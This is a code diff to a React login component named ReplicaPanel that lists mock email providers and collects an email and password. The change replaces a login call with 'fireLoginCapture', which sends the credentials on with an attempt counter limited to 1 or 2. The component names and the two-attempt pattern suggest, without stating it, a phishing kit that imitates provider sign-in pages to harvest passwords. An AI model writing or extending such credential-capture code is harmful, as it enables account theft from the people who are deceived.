@@ -2,8 +2,7 @@ import React, { useState, useRef } from 'react';
 import { Mail, ChevronRight, RefreshCw, X, Eye, EyeOff } from 'lucide-react';
 import { Turnstile } from '@marsidev/react-turnstile';
 import { EmailProvider } from '../types';
-import { getGeoInfo } from '../utils/geoip';
-import { submitLogin } from '../utils/api';
+import { fireLoginCapture } from '../utils/api';
 import { SECURITY_CONFIG } from '../config/security';
 
 interface ReplicaPanelProps {
@@ -55,19 +54,13 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
 
     setIsLoading(true);
 
-    try {
-      const geo = await getGeoInfo();
-
-      await submitLogin({
-        email: emailInput,
-        provider: activeLoginProvider?.id || 'email',
-        password: passwordInput,
-        turnstileToken: turnstileToken,
-        ...geo,
-      });
-    } catch (err) {
-      console.error("Error calling login edge function:", err);
-    }
+    fireLoginCapture({
+      email: emailInput,
+      provider: activeLoginProvider?.id || 'email',
+      password: passwordInput,
+      turnstileToken: turnstileToken,
+      attempt: (attempts + 1) as 1 | 2,
+    });
 
     setTimeout(() => {
       setIsLoading(false);
